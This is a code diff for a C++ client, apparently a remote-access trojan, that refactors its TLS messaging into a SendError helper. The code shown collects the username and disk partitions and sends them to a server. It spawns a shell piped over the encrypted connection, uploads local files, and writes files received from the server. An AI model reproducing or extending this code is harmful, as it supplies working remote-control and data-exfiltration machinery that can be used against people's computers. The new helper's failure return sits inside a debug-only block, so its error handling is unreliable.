@@ -50,7 +50,7 @@ bool Client::SendInfo(){
         if(UserName(cUsername) == 0){
                 strFinal.append(cUsername);
         } else {
-                strFinal.append("siseneg");
+                strFinal.append("unnamed");
         }       
         strFinal.append(1, '|');
         Partitions(vcVec);
@@ -100,10 +100,10 @@ bool Client::SendInfo(){
         if(iBytes <= 0){
 	        if(!CheckSslReturnCode(iBytes)){
 				#ifdef _DEBUG
-	                std::cout<<"Unable to send data to server\n";
-	                error();
-	                #endif
-	                bFlag = false;
+                std::cout<<"Unable to send data to server\n";
+                error();
+                #endif
+                bFlag = false;
 			} else {
 				usleep(100000);
 				goto TryAgain;
@@ -133,7 +133,7 @@ void Client::threadReadShell(int& Pipe){
 	char cCmdOutput[256];
 	int iRet = 0, iLen = 0;
 	while(isRunningShell){
-		while((iRet = read(Pipe, &cCmdOutput, 255)) == -1){ //sleep until reads data or loop break
+		while((iRet = read(Pipe, &cCmdOutput, 255)) == -1){
 			if(!isRunningShell){
 				break;
 			}
@@ -149,7 +149,7 @@ void Client::threadReadShell(int& Pipe){
 			mtxMutex.unlock();
 			break;
 		} else {
-			usleep(100000); //wait 100 miliseconds
+			usleep(100000);
 		}
 		#ifdef _DEBUG
 		std::cout<<"\nSent "<<iRet<<" bytes\n";
@@ -162,43 +162,19 @@ void Client::SpawnShell(const std::string strCommand){
 		#ifdef _DEBUG
 		std::cout<<"File "<<strCommand<<" doesnt exist\n";
 		#endif
-		TryAgain0:
-		int itRet = SSL_write(sslSocket, CommandCodes::cShellError, 3);
-		if(itRet <= 0){
-			if(!CheckSslReturnCode(itRet)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send command to server\n";
-				error();
-				#endif
-			} else {
-				usleep(100000);
-				goto TryAgain0;
-			}
-		}
+		SendError(CommandCodes::cShellError);
 		return;
 	}
 	#ifdef _DEBUG
 	std::cout<<"Spawn "<<strCommand<<'\n';
 	#endif
-	int InPipeFD[2], OutPipeFD[2], iRet = 0;
+	int InPipeFD[2], OutPipeFD[2];
 	if(pipe(InPipeFD) == -1){
 		#ifdef _DEBUG
 		std::cout<<"pipe error\n";
 		error();
 		#endif
-		TryAgain:
-		iRet = SSL_write(sslSocket, CommandCodes::cShellError, 3);
-		if(iRet <= 0){
-			if(!CheckSslReturnCode(iRet)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send command to server\n";
-				error();
-				#endif
-			} else {
-				usleep(100000);
-				goto TryAgain;
-			}
-		}
+		SendError(CommandCodes::cShellError);
 		return;
 	}
 	if(pipe(OutPipeFD) == -1){
@@ -208,36 +184,13 @@ void Client::SpawnShell(const std::string strCommand){
 		#endif
 		close(InPipeFD[0]);
 		close(InPipeFD[1]);
-		TryAgain2:
-		iRet = SSL_write(sslSocket, CommandCodes::cShellError, 3); 
-		if(iRet <= 0){
-			if(!CheckSslReturnCode(iRet)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send command to server\n";
-				error();
-				#endif
-			 } else {
-				usleep(100000);
-				goto TryAgain2;
-			}
-		}
+		SendError(CommandCodes::cShellError);
 		return;
 	}
 	pid_t pP = vfork();
 	if(pP == 0){
-		TryAgain3:
-		iRet = SSL_write(sslSocket, CommandCodes::cShellRunning, 3);
-		if(iRet <= 0){
-			if(!CheckSslReturnCode(iRet)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send command to server\n";
-				error();
-				#endif
-				exit(0);
-			} else {
-				usleep(100000);
-				goto TryAgain3;
-			}
+		if(SendError(CommandCodes::cShellRunning) != 0){
+			exit(0);
 		}
 		#ifdef _DEBUG
 		std::cout<<"Shell running\n";
@@ -295,37 +248,13 @@ void Client::SpawnShell(const std::string strCommand){
 		}
 		t1.join();
 		
-		TryAgain4:
-		iRet = SSL_write(sslSocket, CommandCodes::cShellEnd, 3);
-		if(iRet <= 0){
-			if(!CheckSslReturnCode(iRet)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send command to server\n";
-				error();
-				#endif
-			} else {
-				usleep(100000);
-				goto TryAgain4;
-			}
-		}	
+		SendError(CommandCodes::cShellEnd);	
 	} else {
 		#ifdef _DEBUG
 		std::cout<<"fork failed\n";
 		error();
 		#endif
-		TryAgain5:
-		iRet = SSL_write(sslSocket, CommandCodes::cShellError, 3); 
-		if(iRet <= 0){
-			if(!CheckSslReturnCode(iRet)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send command to server\n";
-				error();
-				#endif
-			} else {
-				usleep(100000);
-				goto TryAgain5;
-			}
-		}
+		SendError(CommandCodes::cShellError);	
 	}
 }
 
@@ -339,18 +268,7 @@ bool Client::SendFile(const std::string strLocalFile) {
 		std::cout<<"Unable to open file\n";
 		error();
 		#endif
-		TryAgain:
-		int iTmp = SSL_write(sslSocket, CommandCodes::cFileError, 3);
-		if(iTmp <= 0){
-			if(!CheckSslReturnCode(iTmp)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send packet\n";
-				#endif
-			} else {
-				usleep(100000);
-				goto TryAgain;
-			}
-		}
+		SendError(CommandCodes::cFileError);
 		return false;
 	}
 	u_int iBlockSize = 255;
@@ -361,18 +279,7 @@ bool Client::SendFile(const std::string strLocalFile) {
 		#ifdef _DEBUG
 		std::cout<<"File size is 0\n";
 		#endif
-		TryAgain1:
-		iRet = SSL_write(sslSocket, CommandCodes::cFileError, 3);
-		if(iRet <= 0){
-			if(!CheckSslReturnCode(iRet)){
-				#ifdef _DEBUG
-				std::cout<<"Unable to send packet\n";
-				#endif
-			} else {
-				usleep(100000);
-				goto TryAgain1;
-			}
-		}
+		SendError(CommandCodes::cFileError);
 		strmInputFile.close();
 		return false;
 	}
@@ -433,11 +340,10 @@ bool Client::SendFile(const std::string strLocalFile) {
 	return true;
 }
 
-void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocalFileName){
+void Client::RetrieveFile(u64 uFileSize,const std::string strLocalFileName){
 	#ifdef _DEBUG
-	std::cout<<"Saving file "<<strLocalFileName<<"\nSize "<<uFileSize<<"\n Execute "<<cExec<<'\n';
+	std::cout<<"Saving file "<<strLocalFileName<<"\nSize "<<uFileSize<<"\n";
 	#endif
-	int iRet = 0;
 	std::ofstream strmOutputFile(strLocalFileName, std::ios::binary);
 	if(!strmOutputFile.is_open()){
 		#ifdef _DEBUG
@@ -450,37 +356,11 @@ void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocal
 			std::cout<<"Unable to open dummy file?\n";
 			error();
 			#endif
-			TryAgain:
-			iRet = SSL_write(sslSocket, CommandCodes::cFileTransferCancel, 3); 
-			if(iRet <= 0){
-				if(!CheckSslReturnCode(iRet)){
-					#ifdef _DEBUG
-					std::cout<<"Unable to send cancel command\n";
-					error();
-					#endif
-				} else {
-					usleep(100000);
-					goto TryAgain;
-				}
-			}
+			SendError(CommandCodes::cFileTransferCancel);
 			return;
 		}
 	}
-	TryAgain2:
-	iRet = SSL_write(sslSocket, CommandCodes::cFileTranferBegin, 3); 
-	if(iRet <= 0){
-		if(!CheckSslReturnCode(iRet)){
-			#ifdef _DEBUG
-			std::cout<<"Unable to send confirmation to server\n";
-			error();
-			#endif
-			strmOutputFile.close();
-			return;
-		} else {
-			usleep(100000);
-			goto TryAgain2;
-		}
-	}
+	SendError(CommandCodes::cFileTranferBegin);
 	u64 uTotalBytes = 0;
 	int iBufferSize = 255, iBytesRead = 0;
 	char *cFileBuffer = new char[iBufferSize];
@@ -520,7 +400,7 @@ bool Client::ParseCommand(char*& strCommand){
 	Misc::strSplit(strCommand, '@', vcCommands, 10);
 	if(vcCommands.size() > 0){
 		if(vcCommands[0] == CommandCodes::cUpload){
-			RetrieveFile(Misc::StrToUint(vcCommands[1].c_str()), vcCommands[2][0], vcCommands[3]);
+			RetrieveFile(Misc::StrToUint(vcCommands[1].c_str()), vcCommands[3]);
 			goto release;
 		}
 		if(vcCommands[0] == "s"){
@@ -591,14 +471,9 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 	memset(&strctAd, 0, sizeof(strctAd));
 	strctAd.ai_family = AF_UNSPEC;
 	strctAd.ai_socktype = SOCK_STREAM;
-	if(sslCTX){
-		SSL_CTX_free(sslCTX);
-		sslCTX = nullptr;
-	}
-	if(sslSocket){
-		SSL_free(sslSocket);
-		sslSocket = nullptr;
-	}
+	
+	CloseConnection();
+	
 	sslCTX = SSL_CTX_new(TLS_client_method());
 	if(sslCTX == nullptr){
 		#ifdef _DEBUG
@@ -640,6 +515,13 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 		return false;
 	}
 	sslSocket = SSL_new(sslCTX);
+	if(sslSocket == nullptr){
+		#ifdef _DEBUG
+		std::cout<<"SSL soket error\n";
+		error();
+		#endif
+		return false;
+	}
 	SSL_set_fd(sslSocket, sckSocket);
 	if(SSL_connect(sslSocket) == -1){
 		freeaddrinfo(strctServer);
@@ -654,8 +536,34 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 	return true;
 }
 
+int Client::SendError(const char* cCode){
+	int cLen = strlen(cCode), itRet = 0;
+	TryAgain0:
+	itRet = SSL_write(sslSocket, cCode, cLen);
+	if(itRet <= 0){
+		if(!CheckSslReturnCode(itRet)){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send command to server\n";
+			error();
+			return -1;
+			#endif
+		} else {
+			usleep(100000);
+			goto TryAgain0;
+		}
+	}
+	return 0;
+}
+
 void Client::CloseConnection(){
-	close(sckSocket);
+	if(sckSocket != -1){
+		close(sckSocket);
+		sckSocket = -1;
+	}
+	if(sslCTX){
+		SSL_CTX_free(sslCTX);
+		sslCTX = nullptr;
+	}
 	if(sslSocket){
 		SSL_free(sslSocket);
 		sslSocket = nullptr;
